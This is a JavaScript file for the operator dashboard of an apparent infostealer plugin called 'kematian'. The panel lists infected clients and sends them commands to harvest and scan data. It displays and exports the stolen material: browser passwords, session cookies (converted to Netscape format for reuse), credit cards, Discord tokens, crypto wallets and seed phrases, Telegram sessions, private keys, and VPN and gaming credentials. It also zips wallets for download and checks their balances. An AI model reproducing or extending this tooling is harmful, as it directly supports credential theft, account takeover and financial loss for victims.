(() => {
  const PLUGIN_ID = "kematian";
  const PAGE_SIZE = 1000;
  const ROW_H = 28;
  const VBUF = 20;

  const params = new URLSearchParams(window.location.search);
  const clientId = params.get("clientId") || "";
  const isGlobal = !clientId;

  const __ctx = clientId || "__global__";
  if (window.__kematianCtx === __ctx) return;
  if (window.__kematianSSE) { window.__kematianSSE.close(); window.__kematianSSE = null; }
  if (window.__kematianPoll) { clearInterval(window.__kematianPoll); window.__kematianPoll = null; }
  window.__kematianCtx = __ctx;

  const $ = (id) => document.getElementById(id);

  // ── DOM refs ──────────────────────────────────────────────────
  const logEl        = $("log");
  const dataCard     = $("data-card");
  const collectErrorsEl = $("collect-errors");
  const tabsEl       = $("tabs");
  const bfiltsEl     = $("bfilts");
  const cfiltsEl     = $("cfilts");
  const searchEl     = $("search");
  const searchClear  = $("search-clear");
  const thead        = $("data-thead");
  const tbody        = $("data-tbody");
  const tableWrap    = document.querySelector(".table-wrap");
  const noRows       = $("no-rows");
  const rowCount     = $("row-count");
  const exportTabBtn = $("export-tab-btn");
  const revealToggle = $("reveal-toggle");
  const pagBar       = $("pagination-bar");
  const pagPrev      = $("page-prev");
  const pagNext      = $("page-next");
  const pagInfo      = $("page-info");

  const clientCard   = $("client-card");
  const clientIdEl   = $("client-id");
  const statusDot    = $("status-dot");
  const statusText   = $("status-text");
  const collectBtn   = $("collect-btn");
  const scanFilesBtn = $("scan-files-btn");
  const scanExtBtn   = $("scan-ext-btn");
  const scanWalletsBtn = $("scan-wallets-btn");
  const scanTgBtn    = $("scan-tg-btn");
  const scanKeysBtn  = $("scan-keys-btn");
  const scanAppsBtn  = $("scan-apps-btn");
  const scanGamingBtn = $("scan-gaming-btn");
  const scanVpnBtn    = $("scan-vpn-btn");
  const pingBtn      = $("ping-btn");
  const exportBtn    = $("export-btn");

  const fingerprintBtn = $("fingerprint-btn");
  const fingerprintDeepBtn = $("fingerprint-deep-btn");
  const fpOverlay    = $("fp-overlay");
  const fpClose      = $("fp-close");
  const fpContent    = $("fp-content");
  const fpCopy       = $("fp-copy");
  const fpDownload   = $("fp-download");

  const discordViewEl   = $("discord-view");
  const dpGrid          = $("dp-grid");
  const enrichAllBtn    = $("enrich-all-btn");
  const enrichStatus    = $("enrich-status");

  const walletViewEl    = $("wallet-view");
  const wlGrid          = $("wl-grid");
  const checkBalancesBtn = $("check-balances-btn");
  const balanceStatus   = $("balance-status");

  const settingsCard     = $("settings-card");
  const settingsGrid     = $("settings-grid");
  const settingsAdminMsg = $("settings-admin-msg");
  const settingsStatus   = $("settings-status");
  const autoHarvestToggle = $("auto-harvest-toggle");
  const autoFilesToggle   = $("auto-files-toggle");
  const autoExtToggle     = $("auto-ext-toggle");
  const captureHistoryToggle = $("capture-history-toggle");
  const captureCookiesToggle = $("capture-cookies-toggle");
  const historyLimitInput = $("history-limit-input");
  const cookieAgeInput    = $("cookie-age-input");
  const purgeHistoryBtn   = $("purge-history-btn");
  const purgeCookiesBtn   = $("purge-cookies-btn");

  const globalCard   = $("global-card");
  const clientsCard  = $("clients-card");
  const clientsList  = $("clients-list");
  const globalStats  = $("global-stats");
  const refreshBtn   = $("refresh-btn");
  const exportAllBtn = $("export-all-btn");
  const clearAllBtn  = $("clear-all-btn");
  const summaryCard  = $("summary-card");
  const summaryGrid  = $("summary-grid");
  const summaryTotals = $("summary-totals");
  const searchAllView  = $("search-all-view");
  const searchAllGrid  = $("search-all-grid");
  const searchAllEmpty = $("search-all-empty");

  // ── Column definitions ────────────────────────────────────────
  const CLIENT_COL = { k: "clientId", h: "Client", clientbadge: true };

  const TABS = [
    {
      id: "passwords", label: "Passwords", key: "passwords", rpc: "list_passwords",
      cols: [
        { k: "url",      h: "URL",      grow: true },
        { k: "username", h: "Username" },
        { k: "password", h: "Password", sensitive: true },
        { k: "browser",  h: "Browser",  badge: true },
        { k: "profile",  h: "Profile" },
      ],
    },
    {
      id: "cookies", label: "Cookies", key: "cookies", rpc: "list_cookies",
      cols: [
        { k: "host",       h: "Host",    grow: true },
        { k: "name",       h: "Name" },
        { k: "value",      h: "Value",   truncate: true },
        { k: "path",       h: "Path" },
        { k: "secure",     h: "Sec",     bool: true },
        { k: "httpOnly",   h: "HTTP",    bool: true },
        { k: "expiresUtc", h: "Expires", chromets: true },
        { k: "browser",    h: "Browser", badge: true },
        { k: "profile",    h: "Profile" },
      ],
    },
    {
      id: "autofill", label: "Autofill", key: "autofill", rpc: "list_autofill",
      cols: [
        { k: "name",    h: "Field",   grow: true },
        { k: "value",   h: "Value",   truncate: true },
        { k: "browser", h: "Browser", badge: true },
        { k: "profile", h: "Profile" },
      ],
    },
    {
      id: "history", label: "History", key: "history", rpc: "list_history",
      cols: [
        { k: "url",           h: "URL",     grow: true },
        { k: "title",         h: "Title" },
        { k: "visitTimeUnix", h: "Visited", unixtimestamp: true },
        { k: "browser",       h: "Browser", badge: true },
        { k: "profile",       h: "Profile" },
      ],
    },
    {
      id: "bookmarks", label: "Bookmarks", key: "bookmarks", rpc: "list_bookmarks",
      cols: [
        { k: "name",    h: "Name",    grow: true },
        { k: "url",     h: "URL",     truncate: true },
        { k: "type",    h: "Type" },
        { k: "browser", h: "Browser", badge: true },
        { k: "profile", h: "Profile" },
      ],
    },
    {
      id: "cards", label: "Cards", key: "creditCards", rpc: "list_credit_cards",
      cols: [
        { k: "nameOnCard",      h: "Name on Card", grow: true },
        { k: "cardNumber",      h: "Card Number",  sensitive: true },
        { k: "expirationMonth", h: "Month" },
        { k: "expirationYear",  h: "Year" },
        { k: "nickname",        h: "Nickname" },
        { k: "browser",         h: "Browser",      badge: true },
        { k: "profile",         h: "Profile" },
      ],
    },
    {
      id: "discord", label: "Discord", key: "discordTokens", rpc: "list_discord_tokens",
      cols: [
        { k: "token",  h: "Token",  grow: true, sensitive: true },
        { k: "source", h: "Source" },
      ],
    },
    {
      id: "files", label: "Files", key: "files", rpc: "list_files",
      cols: [
        { k: "dir",      h: "Location" },
        { k: "name",     h: "Name",     grow: true },
        { k: "ext",      h: "Ext" },
        { k: "size",     h: "Size",     filesize: true },
        { k: "modified", h: "Modified", unixtimestamp: true },
        { k: "tags",     h: "Tags",     seedtag: true },
        { k: "_dl",      h: "",         filedownload: true },
      ],
    },
    {
      id: "extensions", label: "Extensions", key: "extensions", rpc: "list_extensions",
      cols: [
        { k: "name",     h: "Name",    grow: true },
        { k: "version",  h: "Version" },
        { k: "extId",    h: "Ext ID",  mono: true },
        { k: "category", h: "Type",    walletbadge: true },
        { k: "browser",  h: "Browser", badge: true },
        { k: "profile",  h: "Profile" },
        { k: "_dl",      h: "",        extdownload: true },
      ],
    },
    {
      id: "wallets", label: "Wallets", key: "wallets", rpc: "list_wallets",
      cols: [
        { k: "name",  h: "Wallet", grow: true },
        { k: "path",  h: "Path",   truncate: true },
        { k: "files", h: "Files" },
        { k: "size",  h: "Size",   filesize: true },
        { k: "_dl",   h: "",       walletdownload: true },
      ],
    },
    {
      id: "telegram", label: "Telegram", key: "telegram", rpc: "list_telegram",
      cols: [
        { k: "account",    h: "Account",    grow: true },
        { k: "path",       h: "Path",       truncate: true },
        { k: "size",       h: "Size",       filesize: true },
        { k: "hasContent", h: "Downloaded", bool: true },
        { k: "_dl",        h: "",           tgdownload: true },
      ],
    },
    {
      id: "keys", label: "Keys", key: "keys", rpc: "list_keys",
      cols: [
        { k: "type",    h: "Type",    badge: true },
        { k: "name",    h: "Name",    grow: true },
        { k: "path",    h: "Path",    truncate: true },
        { k: "size",    h: "Size",    filesize: true },
        { k: "content", h: "Content", sensitive: true, truncate: true },
      ],
    },
    {
      id: "seeds", label: "Seeds", key: "seeds", rpc: "list_seeds",
      cols: [
        { k: "phrase",  h: "Seed Phrase", sensitive: true, grow: true },
        { k: "words",   h: "Words" },
        { k: "valid",   h: "BIP39",  bool: true },
        { k: "source",  h: "Source", badge: true },
        { k: "path",    h: "Path",   truncate: true },
      ],
    },
    {
      id: "apps", label: "Apps", key: "appCredentials", rpc: "list_app_credentials",
      cols: [
        { k: "application", h: "Application", badge: true },
        { k: "host",        h: "Host",        grow: true },
        { k: "port",        h: "Port" },
        { k: "username",    h: "Username" },
        { k: "password",    h: "Password",    sensitive: true },
        { k: "protocol",    h: "Protocol",    badge: true },
        { k: "extra",       h: "Extra",       truncate: true },
      ],
    },
    {
      id: "gaming", label: "Gaming", key: "_gamingRows", rpc: "list_gaming_items",
      cols: [
        { k: "platform",  h: "Platform",  badge: true },
        { k: "label",     h: "Name",      grow: true },
        { k: "value",     h: "Value",     sensitive: true, truncate: true },
        { k: "detail",    h: "Detail",    truncate: true },
      ],
    },
    {
      id: "vpn", label: "VPN", key: "_vpnRows", rpc: "list_vpn_items",
      cols: [
        { k: "provider",  h: "Provider",  badge: true },
        { k: "label",     h: "Name",      grow: true },
        { k: "value",     h: "Value",     sensitive: true, truncate: true },
        { k: "detail",    h: "Detail",    truncate: true },
      ],
    },
  ];

  const BROWSERS = [
    "Chrome", "Edge", "Brave", "Vivaldi", "Yandex",
    "Arc", "Opera", "Opera GX", "Firefox", "Waterfox",
  ];

  const DATA_KEYS = [
    "passwords", "cookies", "autofill", "history", "bookmarks",
    "creditCards", "discordTokens", "files", "extensions", "wallets",
    "telegram", "keys", "seeds", "appCredentials",
  ];

  function flattenGaming(g) {
    if (!g) return [];
    const rows = [];
    if (g.steam) {
      const s = g.steam;
      if (s.account) rows.push({ platform: "Steam", label: "Account", value: s.account, detail: s.rememberPw ? "Remember PW" : "" });
      if (s.token) rows.push({ platform: "Steam", label: "Token", value: s.token, detail: "" });
      if (s.steamPath) rows.push({ platform: "Steam", label: "Path", value: s.steamPath, detail: "" });
      for (const f of (s.ssfnFiles || [])) rows.push({ platform: "Steam", label: "SSFN", value: f, detail: "" });
      for (const gm of (s.games || [])) rows.push({ platform: "Steam", label: gm.name, value: gm.id, detail: gm.installed ? "Installed" : "" });
    }
    for (const b of (g.battleNet || [])) rows.push({ platform: "Battle.net", label: b.name, value: b.path, detail: "" });
    for (const e of (g.epic || [])) rows.push({ platform: "Epic", label: e.name, value: e.path, detail: "" });
    for (const r of (g.riot || [])) rows.push({ platform: "Riot", label: r.name, value: r.path, detail: "" });
    for (const u of (g.uplay || [])) rows.push({ platform: "Uplay", label: u.name, value: u.path, detail: "" });
    return rows;
  }

  function flattenVPN(v) {
    if (!v) return [];
    const rows = [];
    for (const n of (v.nordvpn || [])) rows.push({ provider: "NordVPN", label: n.username, value: n.password, detail: n.version });
    for (const w of (v.wireguard || [])) rows.push({ provider: "WireGuard", label: w.name, value: w.endpoint || "", detail: w.interface || "" });
    for (const o of (v.openvpn || [])) rows.push({ provider: "OpenVPN", label: o.name, value: o.path, detail: "" });
    for (const m of (v.mullvad || [])) rows.push({ provider: "Mullvad", label: m.accountNumber, value: m.settingsPath, detail: "" });
    return rows;
  }

  // ── Discord helpers ───────────────────────────────────────────
  const DISCORD_BADGE_FLAGS = [
    { f: 1 << 0,  label: "Staff",        title: "Discord Staff" },
    { f: 1 << 1,  label: "Partner",      title: "Partnered Server Owner" },
    { f: 1 << 2,  label: "HypeSquad",    title: "HypeSquad Events" },
    { f: 1 << 3,  label: "Bug Hunter",   title: "Bug Hunter Level 1" },
    { f: 1 << 6,  label: "Bravery",      title: "HypeSquad Bravery" },
    { f: 1 << 7,  label: "Brilliance",   title: "HypeSquad Brilliance" },
    { f: 1 << 8,  label: "Balance",      title: "HypeSquad Balance" },
    { f: 1 << 9,  label: "Early Sup.",   title: "Early Supporter" },
    { f: 1 << 14, label: "Bug Hunter II", title: "Bug Hunter Level 2" },
    { f: 1 << 17, label: "Bot Dev",      title: "Early Verified Bot Developer" },
    { f: 1 << 18, label: "Moderator",    title: "Certified Discord Moderator" },
    { f: 1 << 22, label: "Active Dev",   title: "Active Developer" },
  ];
  const NITRO_LABELS = ["—", "Nitro Classic", "Nitro", "Nitro Basic"];

  function discordSnowflakeDate(id) {
    if (!id) return null;
    try { return new Date(Number(BigInt(id) >> 22n) + 1420070400000); }
    catch { return null; }
  }

  function discordAvatarUrl(userId, hash) {
    if (hash && userId)
      return `https://cdn.discordapp.com/avatars/${userId}/${hash}.webp?size=64`;
    if (userId) {
      try { return `https://cdn.discordapp.com/embed/avatars/${Number(BigInt(userId) % 6n)}.png`; }
      catch { return null; }
    }
    return null;
  }

  function dpBadgesHtml(flags) {
    if (!flags) return "";
    return DISCORD_BADGE_FLAGS
      .filter(b => (flags & b.f) !== 0)
      .map(b => `<span class="dp-badge" title="${esc(b.title)}">${esc(b.label)}</span>`)
      .join("");
  }

  function dpNitroHtml(tier) {
    if (!tier) return "";
    return `<span class="dp-badge dp-badge-nitro">${esc(NITRO_LABELS[tier] || "Nitro")}</span>`;
  }

  // ── State ─────────────────────────────────────────────────────
  let lastResults    = null;
  let tabData        = {};
  let activeTab      = "passwords";
  let activeBrowser  = "all";
  let activeClient   = "all";
  let sortCol        = null;
  let sortAsc        = true;
  let showSensitive  = false;
  let knownClients   = [];
  let searchTimer    = null;
  let userRole       = null;
  let historyView    = "all"; // "all" or "top"
  let searchAllResults = null;

  const pendingFetches = new Map();
  const pendingExtZips = new Map();
  const pendingWalletZips = new Map();
  const pendingTgZips = new Map();
  let walletBalances = {};
  let walletCrackResults = {};

  // ── Virtual scroll ────────────────────────────────────────────
  let virtRows  = [];
  let virtCols  = [];
  let scrollRAF = null;
  let vFirst = -1, vLast = -1;
  const rowPool = [];

  function makeSpacer() {
    const tr = document.createElement("tr");
    const td = document.createElement("td");
    td.style.cssText = "height:0;padding:0;border:0;";
    tr.appendChild(td);
    return tr;
  }
  const topSpacer = makeSpacer();
  const botSpacer = makeSpacer();

  tableWrap.addEventListener("scroll", () => {
    if (scrollRAF) return;
    scrollRAF = requestAnimationFrame(() => { scrollRAF = null; vRender(); });
  }, { passive: true });

  function startVirt(rows, cols, serverTotal) {
    virtRows = rows;
    virtCols = cols;
    vFirst = -1; vLast = -1;
    const span = cols.length || 1;
    topSpacer.cells[0].colSpan = span;
    botSpacer.cells[0].colSpan = span;
    // Reclaim existing rows into pool
    while (tbody.rows.length > 0) {
      const tr = tbody.rows[0];
      if (tr !== topSpacer && tr !== botSpacer) { rowPool.push(tr); tbody.removeChild(tr); }
      else tbody.removeChild(tr);
    }
    tbody.appendChild(topSpacer);
    tbody.appendChild(botSpacer);
    tableWrap.scrollTop = 0;
    const total = serverTotal !== undefined ? serverTotal : rows.length;
    noRows.style.display = total === 0 ? "" : "none";
    rowCount.textContent = `${total.toLocaleString()} ${total === 1 ? "entry" : "entries"}`;
    vRender();
  }

  function updateRow(tr, row, cols) {
    const cells = tr.cells;
    const need = cols.length;
    while (cells.length > need) tr.deleteCell(cells.length - 1);
    for (let c = 0; c < need; c++) {
      let td = cells[c];
      if (!td) { td = document.createElement("td"); tr.appendChild(td); }
      td.innerHTML = cellContent(cols[c], row, showSensitive, searchEl.value.trim());
      const col = cols[c];
      td.title = (col.filedownload || col.extdownload || col.walletdownload || col.tgdownload || col.bool || col.clientbadge) ? "" : "Click to copy";
      td.onclick = cellClickHandler(col, row);
    }
    return tr;
  }

  function cellClickHandler(col, row) {
    return () => {
      if (col.filedownload)    { fetchAndDownload(row.path, row.name, event.currentTarget, row.clientId); return; }
      if (col.extdownload)     { fetchAndDownloadExt(row.path, row.extId, event.currentTarget, row.clientId); return; }
      if (col.walletdownload)  { fetchAndDownloadWallet(row.path, row.name, event.currentTarget, row.clientId); return; }
      if (col.tgdownload)      { fetchAndDownloadTelegram(row.path, row.account, event.currentTarget, row.clientId); return; }
      const val = col.sensitive     ? String(row[col.k] || "")
                : col.chromets      ? chromeTs(row[col.k])
                : col.unixtimestamp ? unixTs(row[col.k])
                : col.filesize      ? String(row[col.k] || "")
                : String(row[col.k] || "");
      if (!val) return;
      const td = event.currentTarget;
      navigator.clipboard.writeText(val).catch(() => {});
      td.classList.add("copied-flash");
      setTimeout(() => td.classList.remove("copied-flash"), 600);
    };
  }

  function vRender() {
    if (!virtRows.length) return;
    const scrollTop = tableWrap.scrollTop;
    const viewH = tableWrap.clientHeight || 520;
    const first = Math.max(0, Math.floor(scrollTop / ROW_H) - VBUF);
    const last = Math.min(virtRows.length, Math.ceil((scrollTop + viewH) / ROW_H) + VBUF);

    if (first === vFirst && last === vLast) return;

    topSpacer.cells[0].style.height = (first * ROW_H) + "px";
    botSpacer.cells[0].style.height = ((virtRows.length - last) * ROW_H) + "px";

    // Remove rows outside new range, return to pool
    let node = topSpacer.nextSibling;
    while (node && node !== botSpacer) {
      const next = node.nextSibling;
      const idx = node._vIdx;
      if (idx === undefined || idx < first || idx >= last) {
        rowPool.push(node);
        tbody.removeChild(node);
      }
      node = next;
    }

    // Insert/update rows in the visible range
    let insertBefore = topSpacer.nextSibling;
    for (let i = first; i < last; i++) {
      if (insertBefore !== botSpacer && insertBefore._vIdx === i) {
        insertBefore = insertBefore.nextSibling;
        continue;
      }
      const tr = rowPool.pop() || document.createElement("tr");
      tr._vIdx = i;
      updateRow(tr, virtRows[i], virtCols);
      tbody.insertBefore(tr, insertBefore);
    }

    vFirst = first;
    vLast = last;
  }

  // ── Utilities ─────────────────────────────────────────────────
  function log(line) {
    logEl.textContent = `[${new Date().toLocaleTimeString()}] ${line}\n` + logEl.textContent;
  }

  function esc(s) {
    return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
  }

  // Escape text and wrap case-insensitive matches of `q` in <mark>.
  function escHighlight(text, q) {
    const safe = esc(text);
    if (!q) return safe;
    const rx = q.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    try {
      return safe.replace(new RegExp("(" + rx + ")", "gi"), "<mark>$1</mark>");
    } catch (_) {
      return safe;
    }
  }

  function chromeTs(v) {
    if (!v || v === 0) return "";
    const ms = Math.round(v / 1000) - 11644473600000;
    return ms <= 0 ? "" : new Date(ms).toLocaleString();
  }

  function unixTs(v) {
    return (!v || v === 0) ? "" : new Date(v * 1000).toLocaleString();
  }

  function humanSize(bytes) {
    if (bytes === 0) return "0 B";
    const units = ["B", "KB", "MB", "GB"];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return (bytes / Math.pow(1024, i)).toFixed(i === 0 ? 0 : 1) + " " + units[i];
  }

  function shortId(id) { return id ? String(id).slice(0, 8) : "?"; }

  function triggerDownload(blob, filename) {
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(a.href), 10000);
  }

  function downloadBase64(content, filename, mime) {
    const raw = atob(content);
    const bytes = new Uint8Array(raw.length);
    for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);
    triggerDownload(new Blob([bytes], mime ? { type: mime } : undefined), filename);
  }

  function downloadBlob(blob, filename) {
    triggerDownload(blob, filename);
  }

  function crc32(data) {
    let crc = 0xFFFFFFFF;
    for (let i = 0; i < data.length; i++) {
      crc ^= data[i];
      for (let j = 0; j < 8; j++) crc = (crc >>> 1) ^ (crc & 1 ? 0xEDB88320 : 0);
    }
    return (crc ^ 0xFFFFFFFF) >>> 0;
  }

  function createZip(files) {
    const enc = new TextEncoder();
    const parts = [];
    const centralDir = [];
    let offset = 0;
    for (const file of files) {
      const nameBytes = enc.encode(file.name);
      const data = file.data;
      const crc = crc32(data);
      const local = new ArrayBuffer(30 + nameBytes.length);
      const lv = new DataView(local);
      lv.setUint32(0, 0x04034b50, true);
      lv.setUint16(4, 20, true);
      lv.setUint16(8, 0, true);
      lv.setUint32(14, crc, true);
      lv.setUint32(18, data.length, true);
      lv.setUint32(22, data.length, true);
      lv.setUint16(26, nameBytes.length, true);
      new Uint8Array(local).set(nameBytes, 30);
      const central = new ArrayBuffer(46 + nameBytes.length);
      const cv = new DataView(central);
      cv.setUint32(0, 0x02014b50, true);
      cv.setUint16(4, 20, true);
      cv.setUint16(6, 20, true);
      cv.setUint32(16, crc, true);
      cv.setUint32(20, data.length, true);
      cv.setUint32(24, data.length, true);
      cv.setUint16(28, nameBytes.length, true);
      cv.setUint32(42, offset, true);
      new Uint8Array(central).set(nameBytes, 46);
      centralDir.push(new Uint8Array(central));
      parts.push(new Uint8Array(local));
      parts.push(data);
      offset += local.byteLength + data.length;
    }
    const cdOffset = offset;
    let cdSize = 0;
    for (const cd of centralDir) { parts.push(cd); cdSize += cd.length; }
    const eocd = new ArrayBuffer(22);
    const ev = new DataView(eocd);
    ev.setUint32(0, 0x06054b50, true);
    ev.setUint16(8, files.length, true);
    ev.setUint16(10, files.length, true);
    ev.setUint32(12, cdSize, true);
    ev.setUint32(16, cdOffset, true);
    parts.push(new Uint8Array(eocd));
    let total = 0;
    for (const p of parts) total += p.length;
    const result = new Uint8Array(total);
    let pos = 0;
    for (const p of parts) { result.set(p, pos); pos += p.length; }
    return result;
  }

  function cookiesToNetscape(cookies) {
    const lines = [
      "# Netscape HTTP Cookie File",
      "# This is a generated file! Do not edit.",
      "",
    ];
    for (const c of cookies) {
      const domain = c.host || "";
      const flag = domain.startsWith(".") ? "TRUE" : "FALSE";
      const path = c.path || "/";
      const secure = c.secure ? "TRUE" : "FALSE";
      let expires = 0;
      if (c.expiresUtc) {
        const us = Number(c.expiresUtc);
        if (us > 0) expires = Math.max(0, Math.floor(us / 1000000) - 11644473600);
      }
      lines.push(`${domain}\t${flag}\t${path}\t${secure}\t${expires}\t${c.name || ""}\t${c.value || ""}`);
    }
    return lines.join("\n");
  }

  function buildExportZip(data, prefix) {
    const enc = new TextEncoder();
    const files = [];
    for (const [key, rows] of Object.entries(data)) {
      if (!rows || !rows.length) continue;
      if (key === "cookies") {
        files.push({ name: `${prefix}/cookies.txt`, data: enc.encode(cookiesToNetscape(rows)) });
      } else {
        files.push({ name: `${prefix}/${key}.json`, data: enc.encode(JSON.stringify(rows, null, 2)) });
      }
    }
    if (!files.length) return null;
    return createZip(files);
  }

  async function exportCurrentTab() {
    const tab = TABS.find(t => t.id === activeTab);
    if (!tab) return;
    let rows;

    if (isGlobal) {
      const p = { limit: 0 };
      if (activeClient !== "all") p.clientId = activeClient;
      if (activeBrowser !== "all" && tab.cols.some(c => c.k === "browser"))
        p.browser = activeBrowser;
      const search = searchEl.value.trim();
      if (search) p.search = search;
      const result = await rpc(tab.rpc, p);
      rows = result.rows;
    } else {
      rows = lastResults?.[tab.key] || [];
      if (activeBrowser !== "all" && tab.cols.some(c => c.k === "browser"))
        rows = rows.filter(r => r.browser === activeBrowser);
      const q = searchEl.value.trim().toLowerCase();
      if (q) rows = rows.filter(r => tab.cols.some(c => String(r[c.k] || "").toLowerCase().includes(q)));
    }

    if (!rows.length) { log("Nothing to export"); return; }

    const stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
    if (tab.id === "cookies") {
      const text = cookiesToNetscape(rows);
      downloadBlob(new Blob([text], { type: "text/plain" }), `${tab.id}-${stamp}.txt`);
    } else {
      const json = JSON.stringify(rows, null, 2);
      downloadBlob(new Blob([json], { type: "application/json" }), `${tab.id}-${stamp}.json`);
    }
    log(`Exported ${rows.length} ${tab.label.toLowerCase()}`);
  }

  // ── Network ───────────────────────────────────────────────────
  async function sendEvent(event, payload, targetId) {
    const cid = targetId || clientId;
    if (!cid) { log("ERROR: no clientId"); return; }
    try {
      const res = await fetch(
        `/api/clients/${encodeURIComponent(cid)}/plugins/${PLUGIN_ID}/event`,
        { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ event, payload }) },
      );
      if (!res.ok) log(`send failed: ${res.status}`);
    } catch (e) { log(`send error: ${e.message}`); }
  }

  async function rpc(method, params) {
    const res = await fetch(`/api/plugins/${PLUGIN_ID}/rpc`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ method, params: params || {} }),
    });
    const data = await res.json();
    if (!data.ok) {
      const msg = data.error || "RPC error";
      console.error(`[kematian] RPC ${method} failed (${res.status}): ${msg}`);
      throw new Error(msg);
    }
    return data.result;
  }

  // ── Fingerprint ────────────────────────────────────────────────
  let fpData = null;

  function showFingerprint(data) {
    fpData = data;
    if (fpContent) fpContent.textContent = JSON.stringify(data, null, 2);
    if (fpOverlay) fpOverlay.style.display = "flex";
  }

  function closeFingerprint() {
    if (fpOverlay) fpOverlay.style.display = "none";
  }

  async function requestFingerprint() {
    if (!clientId) { log("ERROR: no clientId"); return; }
    fingerprintBtn.disabled = true;
    log("Collecting fingerprint…");
    sendEvent("fingerprint", {});
    for (let i = 0; i < 8; i++) {
      await new Promise((r) => setTimeout(r, 400));
      try {
        const fp = await rpc("get_fingerprint", { clientId });
        if (fp && fp.data) { showFingerprint(fp.data); fingerprintBtn.disabled = false; return; }
      } catch (_) {}
    }
    fingerprintBtn.disabled = false;
    log("Fingerprint not received (client offline or not responding)");
  }

  async function requestFingerprintDeep() {
    if (!clientId) { log("ERROR: no clientId"); return; }
    fingerprintDeepBtn.disabled = true;
    log("Collecting deep fingerprint (canvas/WebGL/audio)…");
    sendEvent("fingerprint", {});
    sendEvent("fingerprint_js", {});
    // The JS fingerprint spawns a hidden browser (~2-5s), so poll longer.
    for (let i = 0; i < 15; i++) {
      await new Promise((r) => setTimeout(r, 500));
      try {
        const fp = await rpc("get_fingerprint", { clientId });
        if (fp && fp.data && fp.jsData) { showFingerprint({ ...fp.data, ...fp.jsData }); fingerprintDeepBtn.disabled = false; return; }
      } catch (_) {}
    }
    fingerprintDeepBtn.disabled = false;
    log("Deep fingerprint not received (client offline or not responding)");
  }

  async function fetchUserRole() {
    try {
      const res = await fetch("/api/auth/me");
      if (!res.ok) return null;
      const data = await res.json();
      return data.role || null;
    } catch { return null; }
  }

  // ── Cell rendering ────────────────────────────────────────────
  function cellContent(col, row, reveal, hl) {
    const v = row == null ? "" : (row[col.k] == null ? "" : row[col.k]);
    if (col.clientbadge)
      return `<span class="badge badge-client" title="${esc(String(v))}">${esc(shortId(String(v)))}</span>`;
    if (col.bool)
      return v ? `<span class="bool-yes">✓</span>` : `<span class="bool-no">—</span>`;
    if (col.badge)
      return `<span class="badge badge-${esc(String(v || "").replace(/\s+/g, "-"))}">${esc(String(v || ""))}</span>`;
    if (col.chromets)
      return esc(chromeTs(v));
    if (col.unixtimestamp)
      return esc(unixTs(v));
    if (col.filesize)
      return esc(humanSize(Number(v) || 0));
    if (col.mono)
      return `<span style="font-family:var(--mono,monospace);font-size:11px;color:#94a3b8">${esc(String(v || ""))}</span>`;
    if (col.seedtag) {
      if (!v) return "";
      return String(v).split(",").filter(Boolean)
        .map(t => t === "seed"
          ? `<span class="badge badge-seed">seed phrase</span>`
          : t === "key"
            ? `<span class="badge badge-key">private key</span>`
            : `<span class="badge">${esc(t)}</span>`)
        .join(" ");
    }
    if (col.walletbadge) {
      if (v === "wallet") return `<span class="badge badge-wallet">Wallet</span>`;
      return "";
    }
    if (col.filedownload)
      return `<button class="btn btn-dl" title="Fetch &amp; download">↓</button>`;
    if (col.extdownload)
      return `<button class="btn btn-dl" title="Download as ZIP">ZIP</button>`;
    if (col.walletdownload)
      return `<button class="btn btn-dl" title="Download wallet as ZIP">ZIP</button>`;
    if (col.tgdownload)
      return `<button class="btn btn-dl" title="Download Telegram session as ZIP">ZIP</button>`;
    if (col.sensitive) {
      const text = String(v);
      if (!text) {
        if (col.k === "password" && row && String(row.browser || "") === "Edge") {
          return `<span class="pw-edge-warning" title="Edge did not store the password value for this saved login">PREVIOUS EDGE SAVED PASSWORD</span>`;
        }
        return `<span class="bool-no">—</span>`;
      }
      return reveal
        ? `<span class="sensitive revealed">${escHighlight(text, hl)}</span>`
        : `<span class="sensitive">••••••••</span>`;
    }
    const text = String(v);
    if (col.truncate && text.length > 80)
      return `<span title="${esc(text)}">${escHighlight(text.slice(0, 80), hl)}…</span>`;
    return escHighlight(text, hl);
  }

  function sortValue(col, row) {
    const v = row[col.k];
    if (col.bool) return v ? 1 : 0;
    if (col.chromets || col.unixtimestamp) return v || 0;
    if (col.filesize) return Number(v) || 0;
    if (col.filedownload || col.extdownload || col.walletdownload || col.tgdownload || col.clientbadge) return String(v || "").toLowerCase();
    if (typeof v === "number") return v;
    return String(v || "").toLowerCase();
  }

  function applySortInPlace(rows, cols) {
    if (sortCol === null || sortCol >= cols.length) return;
    const col = cols[sortCol];
    rows.sort((a, b) => {
      const av = sortValue(col, a), bv = sortValue(col, b);
      if (av < bv) return sortAsc ? -1 : 1;
      if (av > bv) return sortAsc ? 1 : -1;
      return 0;
    });
  }

  function buildRow(row, cols) {
    const tr = document.createElement("tr");
    for (const col of cols) {
      const td = document.createElement("td");
      td.innerHTML = cellContent(col, row, showSensitive);
      td.onclick = cellClickHandler(col, row);
      tr.appendChild(td);
    }
    return tr;
  }

  function buildHeader(cols) {
    thead.innerHTML = "";
    const trh = document.createElement("tr");
    cols.forEach((col, i) => {
      const th = document.createElement("th");
      let arrow = "⇅", cls = "";
      if (sortCol === i) { arrow = sortAsc ? "↑" : "↓"; cls = sortAsc ? "sort-asc" : "sort-desc"; }
      th.className = cls;
      th.innerHTML = `${esc(col.h)} <span class="sort-arrow">${arrow}</span>`;
      th.addEventListener("click", () => {
        if (sortCol === i) sortAsc = !sortAsc; else { sortCol = i; sortAsc = true; }
        renderTable();
      });
      trh.appendChild(th);
    });
    thead.appendChild(trh);
  }

  // ── Tabs ──────────────────────────────────────────────────────
  function getGlobalTabTotal(tabKey) {
    if (activeClient !== "all") {
      const c = knownClients.find(x => x.clientId === activeClient);
      return c ? (c[tabKey] || 0) : 0;
    }
    return knownClients.reduce((sum, c) => sum + (c[tabKey] || 0), 0);
  }

  function buildTabs() {
    tabsEl.innerHTML = "";

    const q = searchEl.value.trim();
    if (q) {
